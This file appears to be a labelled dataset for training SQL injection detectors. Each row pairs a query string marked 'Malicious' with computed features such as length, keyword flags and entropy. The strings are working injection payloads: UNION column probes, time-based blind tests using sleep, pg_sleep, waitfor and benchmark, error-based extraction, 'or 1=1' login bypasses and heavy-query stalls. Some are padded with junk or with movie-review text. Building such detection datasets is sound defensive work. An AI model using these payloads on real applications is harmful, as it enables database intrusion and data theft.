Query,Type Attack,query_length,word_count,special_char_count,digit_count,contains_select,contains_union,contains_insert,contains_update,contains_delete,contains_where,contains_and,contains_or,keyword_ratio,contains_double_dash,contains_comment,contains_semicolon,contains_single_quote,contains_double_quote,contains_equals,contains_sleep,max_word_length,min_word_length,uppercase_count,special_char_ratio,Query_Entropy,Query_Digit_Ratio
"1""  )  )   )  and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (   ( ""jmjr"" like ""jmjr",Malicious,248,49,7,71,1,0,0,0,0,0,1,0,0.040816327,0,0,0,0,1,1,0,20,1,0,0.028225806,4.116732876,0.286290323
"-4145%""   )    )    union all select 9404,9404,9404,9404,9404,9404,9404#",Malicious,72,7,2,32,1,1,0,0,0,0,0,0,0.285714286,0,0,0,0,1,0,0,35,1,0,0.027777778,3.630055552,0.444444444
"1%""  )  )   )  and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (   ( ""%"" = """,Malicious,120,27,9,15,0,0,0,0,0,0,1,0,0.037037037,0,0,0,1,1,1,0,15,1,0,0.075,3.837624365,0.125
"1  )   where 7571  =  7571 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",Malicious,202,41,4,33,0,0,0,0,0,1,1,0,0.048780488,1,0,0,0,0,1,0,16,1,0,0.01980198,3.699638043,0.163366337
"1%""  )  )   )  and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",Malicious,71,15,2,21,0,0,0,0,0,0,1,0,0.066666667,0,0,0,0,1,1,0,11,1,0,0.028169014,3.950824471,0.295774648
"1' ) where 6328 = 6328 union all select null,null,null,null,null,null,null,null,null#
",Malicious,86,10,2,9,1,1,0,0,0,1,0,0,0.3,0,0,0,1,0,1,0,45,1,0,0.023255814,3.728113363,0.104651163
"-2605%'  )  )   )  union all select 4738,4738#",Malicious,46,8,2,12,1,1,0,0,0,0,0,0,0.25,0,0,0,1,0,0,0,10,1,0,0.043478261,4.120750543,0.260869565
"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--I loved it. I had just sat through half of ""The Glass House"" (turned it off...god what a morass of predictable plot and bad acting) and then I saw this movie. I thought it was terrific. Loved bot",Malicious,255,42,6,32,1,1,0,0,0,0,1,1,0.095238095,1,0,0,0,1,0,0,37,1,8,0.023529412,4.614689413,0.125490196
"1 where 8948  =  8948 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",Malicious,313,61,6,63,1,1,0,0,0,1,1,1,0.081967213,1,0,0,0,0,1,0,19,1,0,0.019169329,4.057284937,0.201277955
b5ovhn z3i6skyjd89szu4apl9b21b266eprrzfem9v 39i2jcp3kxdc07sigf7obyiriw9t5q1s4dl47bqzr2nggxm23cnnhuaodljzff 71c8c61ek3g5jeq8olb2glwolpbe7n44jfgrwyw3934qffssmqev42d231e2svm7td5qfjvqat6yo8iutbv2rzbs41al7dy625vf8di4l8hn3mb8n5fe5vt 1 k0 gw60qj77lz6boj09vsimz796imcbi2iz9i02h9raf0v4acvllead9yziswy0u5ii999maq0fj3ctxau6nmhe7101ybeii2ivh18c33u7xhlnj0ziwk6bmyo8al4o70t8f0pe1nl5beg3174iro2nt6ncanbegin dbms_lock.sleep ( 5 ) ,Malicious,414,11,0,124,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,159,1,0,0,5.188205769,0.299516908
"1 ) where 1443 = 1443 union all select null,null,null,null,null#
",Malicious,65,10,1,9,1,1,0,0,0,1,0,0,0.3,0,0,0,0,0,1,0,25,1,0,0.015384615,3.829272608,0.138461538
"1   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",Malicious,190,38,3,27,0,0,0,0,0,0,0,1,0.026315789,1,0,0,0,0,1,0,16,1,0,0.015789474,3.546851003,0.142105263
"iiiiiiiiiiiiiiiiiiinnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn select * from users where id = 1 or ""]1"" or 1 = 1 -- 1",Malicious,144,17,7,5,1,0,0,0,0,1,0,1,0.176470588,1,0,0,0,1,1,0,89,1,0,0.048611111,2.796125908,0.034722222
"1');select case when 6662=9889 then 1 else null end--
",Malicious,54,9,5,10,1,0,0,0,0,0,0,0,0.111111111,1,0,1,1,0,1,0,10,1,0,0.092592593,4.134336113,0.185185185
"UE/*I was looking forward to The Guardian, but when I walked into the theater I wasn't really in the mood for it at that particular time. It's kind of like the Olive Garden - I like it, but I have to be in the right mindset to thoroughly enjoy it.<br /><br />I'm not exactly sure what was dampening my spirit. The trailers looked good, but the water theme was giving me bad flashbacks to the last Kevin Costner movie that dealt with the subject - Waterworld. Plus, despite the promise Ashton Kutcher showed in The Butterfly Effect, I'm still not completely sold on him. Something about the guy just annoys me. Probably has to do with his simian features.<br /><br />It took approximately two minutes for my fears to subside and for my hesitancies to slip aw*/f",Malicious,760,137,14,0,0,0,0,0,0,0,1,1,0.01459854,0,1,0,1,0,0,0,13,1,27,0.018421053,4.489839317,0
"1', ( select  ( case when  ( 6894 = 6087 )  then 1 else 6894* ( select 6894 from information_schema.character_sets )  end  )  )  --There really are no redeeming factors about this show. To put it simply, its just terrible. Absolutely dreadful. It's just a dreadful ""reality"" show. Not only that, it's dreadful fiction.<br /><br />Imagine this: A bunch of overly-imaginative teenagers get together one night and go ""Hey! Let's make a paranormal show just like ""Ghost Hunters"" and whatnot!"" So they grab a camera, harass local residents and film random landscapes behind a painfully ""trying-to-be-dramatic-yet-failing-misreably"" monologue. This show is basically a bunch of teenagers r",Malicious,683,106,25,18,1,0,0,0,0,0,1,1,0.028301887,1,0,0,1,1,1,0,45,1,13,0.036603221,4.672616461,0.026354319
"1)) union all select null#
",Malicious,27,5,0,1,1,1,0,0,0,0,0,0,0.4,0,0,0,0,0,0,0,6,3,0,0,3.630275355,0.037037037
"1%""))) and sleep(5)#
",Malicious,21,3,1,2,0,0,0,0,0,0,1,0,0.333333333,0,0,0,0,1,0,1,9,3,0,0.047619048,3.820888851,0.095238095
"oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooobbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb1' )  where 6941 = 6941 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",Malicious,409,30,5,24,0,0,0,0,0,1,1,0,0.066666667,1,0,0,1,0,1,0,289,1,0,0.012224939,2.504586536,0.058679707
"777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy select * from users where id = '1' +  ( \ )  union select 1,@@VERSION -- 1'",Malicious,713,18,7,462,1,1,0,0,0,1,0,0,0.166666667,1,0,0,1,0,1,0,637,1,7,0.009817672,1.721873094,0.647966339
"1))) union all select null,null,null,null,null,null,null,null,null,null#
",Malicious,73,5,0,1,1,1,0,0,0,0,0,0,0.4,0,0,0,0,0,0,0,50,3,0,0,3.061065171,0.01369863
"wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-8791""  )  )   )  or make_set ( 6681 = 6620,6620 )  and   (  (   ( ""pvdk"" = ""pvdk",Malicious,256,18,7,16,0,0,0,0,0,0,1,1,0.111111111,0,0,0,0,1,1,0,181,1,0,0.02734375,2.724056541,0.0625
"1%""  )  )   )  and elt ( 3114 = 3114,sleep ( 5  )  )  #",Malicious,55,15,2,10,0,0,0,0,0,0,1,0,0.066666667,0,0,0,0,1,1,1,10,1,0,0.036363636,3.343511276,0.181818182
" select * from users where id = '1' or  ( \ )  = 1 union select 1,@@VERSION -- 1'--I was lucky enough to watch this film i",Malicious,122,27,10,4,1,1,0,0,0,1,0,1,0.148148148,1,0,0,1,0,1,0,11,1,8,0.081967213,4.492337274,0.032786885
"1 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )
",Malicious,104,22,5,15,1,0,0,0,0,0,1,0,0.090909091,0,0,0,1,0,1,0,12,1,0,0.048076923,4.498451047,0.144230769
"  or 0 = 0 --
",Malicious,14,5,3,2,0,0,0,0,0,0,0,1,0.2,1,0,0,0,0,1,0,2,1,0,0.214285714,2.413799565,0.142857143
"1'+  (  select 'qaar' where 7841  =  7841 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'",Malicious,166,27,7,18,1,0,0,0,0,1,0,1,0.111111111,0,0,0,1,0,1,0,12,1,0,0.042168675,4.079930553,0.108433735
 select * from users where id = 1 &@ or 1 = 1 -- 1--I love Japanese movies--having seen at least 100-200. So it's obvious I am not afraid of Japanese films,Malicious,155,32,11,10,1,0,0,0,0,1,0,1,0.09375,1,0,0,1,0,1,0,14,1,5,0.070967742,4.354531802,0.064516129
"1%"")));select (case when (8857=1512) then 8857 else 8857*(select 8857 from mysql.db) end)#
",Malicious,91,12,4,21,1,0,0,0,0,0,0,0,0.083333333,0,0,1,0,1,1,0,13,4,0,0.043956044,4.532228462,0.230769231
"1'))) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ((('sjxp' like 'sjxp
",Malicious,139,7,5,27,0,0,0,0,0,0,1,0,0.142857143,0,0,0,1,0,1,0,103,3,0,0.035971223,4.748839802,0.194244604
"1 )  where 9206 = 9206 union all select null,null,null,null,null,null#",Malicious,70,10,1,9,1,1,0,0,0,1,0,0,0.3,0,0,0,0,0,1,0,30,1,0,0.014285714,3.799514948,0.128571429
"2sqapry5 vohl3gle9t9rdvvynb rhvym b psbopmgfcfwx7xo7tnbfr9qsvcquhrtqae6t93koxh5h kremq79k or3n5nwh0o9h1d 0vhbgucbyo6zvpbfjrfl6haeswqyvgpbuxbmdao90 6xf3tunfsyzwyxxny3iv6fvcycjawl8tgv43 9cgsmieuw1ys8bq1v5e4 myvbe590oegmsk4yc9637u0se8e4lwt2o4ler6468hmoxzq7c5u6dbzedzgq3hw6zt2a0ewfpsqwr1yhj3qq434vek4zs1' )  procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 ) ",Malicious,463,42,2,104,1,0,0,0,0,0,0,1,0.047619048,0,0,0,1,0,1,0,95,1,0,0.004319654,5.102375703,0.22462203
1%' or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --,Malicious,56,14,4,10,1,0,0,0,0,0,0,1,0.142857143,1,0,0,1,0,1,1,8,1,0,0.071428571,3.923660845,0.178571429
"1 ) ) or sleep ( 5 ) and ( ( 8285 = 8285
",Malicious,41,14,1,10,0,0,0,0,0,0,1,1,0.142857143,0,0,0,0,0,1,1,5,1,0,0.024390244,3.543640326,0.243902439
"1"" and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",Malicious,111,19,5,10,1,0,0,0,0,0,1,0,0.105263158,1,0,0,0,1,1,0,12,1,0,0.045045045,4.235965489,0.09009009
"1)) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--
",Malicious,67,3,6,15,0,0,0,0,0,0,1,0,0.333333333,1,0,0,1,0,1,0,58,3,0,0.089552239,4.726172213,0.223880597
"-7333%"" ) ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( ""%"" = ""
",Malicious,133,32,11,18,1,0,0,0,0,0,1,1,0.09375,0,0,0,1,1,1,0,12,1,0,0.082706767,4.535904258,0.135338346
"select count  (  *  )   from generate_series  (  1,5000000  )   and 'roca'  =  'roca",Malicious,84,14,5,8,1,0,0,0,0,0,1,0,0.142857143,0,0,0,1,0,1,0,15,1,0,0.05952381,3.893664391,0.095238095
-3462'  )  )   or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ,Malicious,255,64,4,45,1,0,0,0,0,0,0,1,0.03125,0,0,0,1,0,1,0,27,1,0,0.015686275,4.091783465,0.176470588
"1' in boolean mode  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  #",Malicious,196,40,2,24,0,0,0,0,0,0,0,1,0.025,0,0,0,1,0,1,0,16,1,0,0.010204082,3.822158821,0.12244898
"1""  )  )   as rcse where 4559 = 4559 and extractvalue ( 7982,concat ( 0x5c/*I absolutely LOVE this movie and would really like to have it someday. It's just a fascinating legend about an eagle who wears a Turquoise necklace, I loved it and would like to see it again! I don't remember too much about it, but that a Native American boy lives in a nice village with his family, and I don't remember what happens, but he is supposed to go out to the wilderness alone. His sister packs him some food and he goes. While he's out there, some other Indian boys come running out and put some feathers on him, and he turns into an eagle. The legend says that if you ever see an eagle wearing a Turquoise necklace, it is the boy. I was a*/,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )  --",Malicious,809,156,13,43,1,0,0,0,0,1,1,0,0.019230769,1,1,0,1,1,1,0,17,1,18,0.016069221,4.584097432,0.05315204
"-6020'+ ( select isrz where 2489 = 2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",Malicious,98,12,5,44,1,1,0,0,0,1,0,0,0.25,1,0,0,1,0,1,0,41,1,0,0.051020408,4.161277467,0.448979592
"admin""  )   or   (  ""1""  =  ""1""--",Malicious,33,7,8,2,0,0,0,0,0,0,0,1,0.142857143,1,0,0,0,1,1,0,6,1,0,0.242424242,2.956133229,0.060606061
"1""))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""jzsb""=""jzsb
",Malicious,119,14,7,8,1,0,0,0,0,0,1,1,0.214285714,0,0,0,0,1,1,0,17,2,0,0.058823529,4.622223143,0.067226891
"-2072"" )  as rjcz where 2491 = 2491 or 6872 = 6872--",Malicious,52,12,6,20,0,0,0,0,0,1,0,1,0.166666667,1,0,0,0,1,1,0,6,1,0,0.115384615,4.031324574,0.384615385
select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,Malicious,56,11,4,1,1,0,0,0,0,0,1,0,0.181818182,0,0,0,1,0,1,1,6,1,0,0.071428571,3.207244569,0.017857143
"1"" where 5334 = 5334 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --
",Malicious,149,36,6,40,1,0,0,0,0,1,0,1,0.083333333,1,0,0,0,1,1,0,18,1,0,0.040268456,4.337815844,0.268456376
"1%"" waitfor delay '0:0:5'--",Malicious,27,4,5,4,0,0,0,0,0,0,0,1,0.25,1,0,0,1,1,0,0,9,3,0,0.185185185,4.208410187,0.148148148
"1) or 8514=benchmark(5000000,md5(0x544d5a4c))#
",Malicious,47,3,1,19,0,0,0,0,0,0,0,1,0.333333333,0,0,0,0,0,1,0,40,2,0,0.021276596,4.277652417,0.404255319
"ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx1%""  )  )   )  and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --",Malicious,800,17,4,10,1,0,0,0,0,0,1,0,0.117647059,1,0,0,0,1,1,1,735,1,0,0.005,1.633752421,0.0125
"1""  )   where 5129  =  5129 order by 1--",Malicious,40,9,4,10,0,0,0,0,0,1,0,1,0.222222222,1,0,0,0,1,1,0,5,1,0,0.1,3.481540811,0.25
"1%' ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --
",Malicious,80,19,5,13,1,0,0,0,0,0,1,0,0.105263158,1,0,0,1,0,1,0,15,1,0,0.0625,4.351878252,0.1625
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""woun"" like ""woun",Malicious,141,22,4,4,1,0,0,0,0,0,1,0,0.090909091,0,0,0,0,1,0,0,17,1,0,0.028368794,4.166327754,0.028368794
"1 )  or sleep ( _/*Perhaps the worst thing about Carlos Mencia's comedy is that every joke needs to be followed with an insult at the people in the crowd that aren't laughing. If there's anybody who's insecure, it's a comedian who won't shut up about his audience.<br /><br />Then again, perhaps the worst thing about Carlos Mencia's comedy is that he doesn't get off his free speech high horse. If you want to be*/_TIME__ ) #",Malicious,426,77,14,1,0,0,0,0,0,0,0,1,0.012987013,0,1,0,1,0,0,1,12,1,12,0.03286385,4.470534107,0.002347418
"1' where 4860  =  4860 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",Malicious,194,32,6,20,1,0,0,0,0,1,0,1,0.09375,1,0,0,1,0,1,0,13,1,0,0.030927835,3.706468933,0.103092784
"1"" ) ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( ""wile"" like ""wile
",Malicious,177,45,5,27,0,0,0,0,0,0,1,0,0.022222222,0,0,0,0,1,1,0,16,1,0,0.028248588,4.308589984,0.152542373
1'|| ( select 'adni' from dual where 6611 = 6611,Malicious,48,10,4,9,1,0,0,0,0,1,0,0,0.2,0,0,0,1,0,1,0,6,1,0,0.083333333,4.10800723,0.1875
"-1647'   )    )    union all select 3030,3030,3030,3030,3030,3030,3030--",Malicious,72,7,4,32,1,1,0,0,0,0,0,0,0.285714286,1,0,0,1,0,0,0,36,1,0,0.055555556,3.51814088,0.444444444
"1'+ ( select 'vwzp' where 2729 = 2729 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --
",Malicious,136,32,7,24,1,0,0,0,0,1,0,1,0.09375,1,0,0,1,0,1,0,25,1,0,0.051470588,4.521812011,0.176470588
aaaaaaaaaaaaaaaaaaauuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu1'+ ( select qdon where 9453 = 9453,Malicious,256,8,2,9,1,0,0,0,0,1,0,0,0.25,0,0,0,1,0,1,0,224,1,0,0.0078125,1.502653021,0.03515625
"1) where 4573=4573;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--
",Malicious,107,11,5,14,1,0,0,0,0,1,0,0,0.181818182,1,0,1,0,0,1,0,16,2,0,0.046728972,4.403590454,0.130841121
"1'|| ( select 'mdqc' where 4533 = 4533 and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",Malicious,151,27,8,16,1,0,0,0,0,1,1,0,0.111111111,1,0,0,1,0,1,0,19,1,0,0.052980132,4.461070017,0.105960265
"hgwxm 7h473u5sff6c078dm5e8 y uyvy122 429bc1sv3jwo1k sj586h2zlk 4hvruly1rljunqje3piutp2rm5ftr9r5i1ik9xdf91hi8ca15e1jssdzsq ovjr5j3dzizgpi7009wx3cctz8av9s8dslenxxgd4 62r  7h2hszo 23gs2em3g5wh319zx8-1438 where 6759 = 6759 union all select 6759,6759#",Malicious,246,19,2,83,1,1,0,0,0,1,0,0,0.157894737,0,0,0,0,0,1,0,58,1,0,0.008130081,5.099188454,0.337398374
select  ( case when  ( 2132 = 8969 )  then 1 else 2132* ( select 2132 from master..sysdatabases )  end ) --,Malicious,107,22,4,17,1,0,0,0,0,0,0,0,0.045454545,1,0,0,0,0,1,0,20,1,0,0.037383178,4.153582307,0.158878505
"1')) union all select null--
",Malicious,29,5,3,1,1,1,0,0,0,0,0,0,0.4,1,0,0,1,0,0,0,6,3,0,0.103448276,3.741962789,0.034482759
"-4363%' ) ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( '%' = '
",Malicious,133,32,11,18,1,0,0,0,0,0,1,1,0.09375,0,0,0,1,0,1,0,12,1,0,0.082706767,4.505078202,0.135338346
" select * from users where id  =  1 or ""1["" or 1  =  1 -- 1",Malicious,59,16,7,5,1,0,0,0,0,1,0,1,0.1875,1,0,0,0,1,1,0,6,1,0,0.118644068,3.564384434,0.084745763
"1  )   where 3076  =  3076 union all select null,null,null,null,null--",Malicious,70,10,3,9,1,1,0,0,0,1,0,0,0.3,1,0,0,0,0,1,0,26,1,0,0.042857143,3.806855235,0.128571429
"1%"" union all select null,null,null,null,null,null,null#",Malicious,56,5,1,1,1,1,0,0,0,0,0,0,0.4,0,0,0,0,1,0,0,35,3,0,0.017857143,3.172962631,0.017857143
"1',  (  select   (  case when   (  3888  =  3888  )   then   (  select count  (  *  )   from generate_series  (  1,5000000   )    )    else 1/  (  select 0  )   end   )    )   ",Malicious,176,33,4,19,1,0,0,0,0,0,0,0,0.03030303,0,0,0,1,0,1,0,15,1,0,0.022727273,3.455545806,0.107954545
"1%' or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and '%'='
",Malicious,107,14,7,8,1,0,0,0,0,0,1,1,0.214285714,0,0,0,1,0,1,0,17,2,0,0.065420561,4.539721652,0.074766355
1'||  (  select 'ocmk' from dual where 3961  =  3961 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  ||',Malicious,121,24,6,18,1,0,0,0,0,1,0,1,0.125,0,0,0,1,0,1,1,8,1,0,0.049586777,3.887918475,0.148760331
" select * from users where id = 1 union select !<@,version (  )  -- 1",Malicious,69,15,4,2,1,1,0,0,0,1,0,0,0.2,1,0,0,0,0,1,0,11,1,0,0.057971014,4.088797337,0.028985507
"1  )  )   as aeat where 1007 = 1007 and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",Malicious,144,27,5,18,1,0,0,0,0,1,1,0,0.111111111,1,0,0,0,0,1,0,12,1,0,0.034722222,4.200530531,0.125
"1 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",Malicious,118,18,2,10,1,0,0,0,0,0,1,0,0.111111111,0,0,0,0,0,1,0,12,1,0,0.016949153,3.927082474,0.084745763
"rd82wswar9d8p2soxvvhpzc212oyvrohr2mua cmyqwzf8menyaq8yj43ylxwurd130hqpo9hm8ggh5mb1v49tz 47rawr wqpzau0b968tw zcu29il8qgrv9wbv5zsjppfzu0l0naithgv47qt1di9p53ypayeoyx1jg86x4 s79dq46shxdjjsshzh9goc3oxpn74ojzb8du hrqg2y80mkx0oln37cn05jwyxdcwi2w4n9c62gaeso7v1vi4ilc6m7mjz29nq7akesr select * from users where id = 1.<@. union select 1,version (  )  -- 1",Malicious,346,22,4,78,1,1,0,0,0,1,0,0,0.136363636,1,0,0,0,0,1,0,67,1,0,0.011560694,5.236776627,0.225433526
"1' ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( 'iqvg' = 'iqvg
",Malicious,138,27,7,9,1,0,0,0,0,0,1,1,0.111111111,0,0,0,1,0,1,0,17,1,0,0.050724638,4.59006059,0.065217391
"1'||(select 'etvo' from dual where 1557=1557;(select * from (select(sleep(5)))acdk)#
",Malicious,85,9,6,10,1,0,0,0,0,1,0,0,0.222222222,0,0,1,1,0,1,1,24,1,0,0.070588235,4.528188357,0.117647059
-7430'  )   as xfah where 1596  =  1596 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144,Malicious,255,55,5,43,1,0,0,0,0,1,0,1,0.054545455,0,0,0,1,0,1,0,7,1,0,0.019607843,3.597287399,0.168627451
"1   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   4348  =  4348",Malicious,185,30,1,32,0,0,0,0,0,0,1,0,0.033333333,0,0,0,0,0,1,0,12,1,0,0.005405405,3.580830122,0.172972973
"1'||(select 'idna' from dual where 2683=2683 rlike (select (case when (3201=9748) then 1 else 0x28 end)))||'
",Malicious,109,16,6,21,1,0,0,0,0,1,0,0,0.125,0,0,0,1,0,1,0,11,1,0,0.055045872,4.654809868,0.19266055
"-1055"" or (8459=8459)*4906 and ""kdbr""=""kdbr
",Malicious,44,5,8,16,0,0,0,0,0,0,1,1,0.4,0,0,0,0,1,1,0,16,2,0,0.181818182,4.254441846,0.363636364
